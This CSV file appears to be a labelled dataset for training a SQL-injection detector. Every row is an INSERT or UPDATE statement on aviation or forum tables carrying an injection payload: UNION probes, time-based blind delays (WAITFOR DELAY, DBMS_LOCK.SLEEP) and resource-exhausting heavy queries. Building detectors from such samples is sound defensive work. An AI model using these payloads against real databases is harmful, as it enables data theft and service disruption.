query,label
"UPDATE airport SET he_displaced_threshold_ft = 'New Airport Management' WHERE he_displaced_threshold_ft  = ""'Aragatsotn Province  OR 5852=(SELECT COUNT(*) FROM INFORMATION_SCHEMA.COLUMNS A, INFORMATION_SCHEMA.COLUMNS B, INFORMATION_SCHEMA.COLUMNS C WHERE 0 XOR 1)#"";",1
"UPDATE countries SET entlatitude_deg = 'Status' WHERE entlatitude_deg  = """"Hauts-de-France  UNION SELECT {COLUMN 20 NUL} {GENERIC_SQL_COMMENT}"";",1
"UPDATE countries SET home_link = '""NZ  UNION SELECT {COLUMN 10 NUL} {GENERIC_SQL_COMMENT}' WHERE home_link  = 32.32939910888672 AND home_link  = -71.09420013427734;",1
"INSERT INTO airport_frequencies (length_ft, length_ft ) VALUES (""deborah"", 'Cortina Airport information'), (""deborah"", ''Re: looking for good advice  ,(SELECT * FROM GENERATE_SERIES(7442,3132,CASE WHEN (5646>=9774) THEN 1 ELSE 0 END) LIMIT 1)');",1
"INSERT INTO airport (he_longitude_deg, he_longitude_deg, he_longitude_deg , he_longitude_deg, he_longitude_deg, he_longitude_deg) VALUES (5188, 5188, -36.295969, "" (SELECT (CASE WHEN (2631<5990) THEN 9262 ELSE 8254*(SELECT 8897 UNION ALL SELECT {RANDNUM1}) END));",1
"INSERT INTO countries (body, body ) VALUES (""alexis"", 're: 3rd time to leave PH, working freelance'), (""'rooster  AND 5070=('AO8'||{QUERY}||'Baz')"", 're: 3rd time to leave PH, working freelance');",1
"INSERT INTO airport_frequencies (he_displaced_threshold_ft, he_displaced_threshold_ft ) VALUES (""cassandr"", 'Make !!! Make !!! Make !!!'), (""""grahm  ,GTID_SUBSET(CONCAT('78G',{QUERY},'cNT'),5298)"", 'Make !!! Make !!! Make !!!');",1
"INSERT INTO navaids (surface, surface ) VALUES (""tarpon"", '' (SELECT CONCAT('gRi',{QUERY},'6Mb'))'), (""tarpon"", 'Runway Closed as of 2/25/12');",1
"INSERT INTO navaids (entlatitude_deg, entlatitude_deg, entlatitude_deg, entlatitude_deg, entlatitude_deg) VALUES (21025, 'IT', """" SELECT 'pwv'||{QUERY}||'C0z' FROM RDB$DATABASE"", 'HADD', NULL);",1
"INSERT INTO airport_frequencies (airport_ent, airport_ent, airport_ent , airport_ent, airport_ent, airport_ent) VALUES (6502, 6502, ""'AUTO INFO  ;SELECT LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(900000000/2))))"", ""Brandenburg Hbf"", 37.52920150756836, -102.52799987792969);",1
"INSERT INTO airport (he_elevation_ft, he_elevation_ft, he_elevation_ft , he_elevation_ft, he_elevation_ft, he_elevation_ft) VALUES (18316, 18316, 40.065822, '-85.871916  ;WAITFOR DELAY '0:0:2');",1
"INSERT INTO runways (lighted, lighted, lighted , lighted, lighted, lighted) VALUES (46539, 46539, 34.73979949951172, ' BEGIN IF (5688=207) THEN DBMS_LOCK.SLEEP(1); ELSE DBMS_LOCK.SLEEP(0); END IF; END;);",1
"INSERT INTO airport (threadRef, threadRef ) VALUES (""""qwert  OR 8110=(SELECT COUNT(*) FROM INFORMATION_SCHEMA.COLUMNS A, INFORMATION_SCHEMA.COLUMNS B, INFORMATION_SCHEMA.COLUMNS C WHERE 0 XOR 1)#"", 'WHAT IS HERE'), (""accord"", 'WHAT IS HERE');",1
"INSERT INTO airport_comments (le_displaced_threshold_ft, le_displaced_threshold_ft ) VALUES (""kayleigh"", 'People in immigration so .......'), (""""women  UNION SELECT {COLUMN 20 NUL} {GENERIC_SQL_COMMENT}"", 'People in immigration so .......');",1
"INSERT INTO countries (threadRef, threadRef, threadRef , threadRef, threadRef, threadRef) VALUES (26852, ""18640  UNION SELECT {COLUMN RA CHA} {GENERIC_SQL_COMMENT}, 37.412624, 23.526018);",1
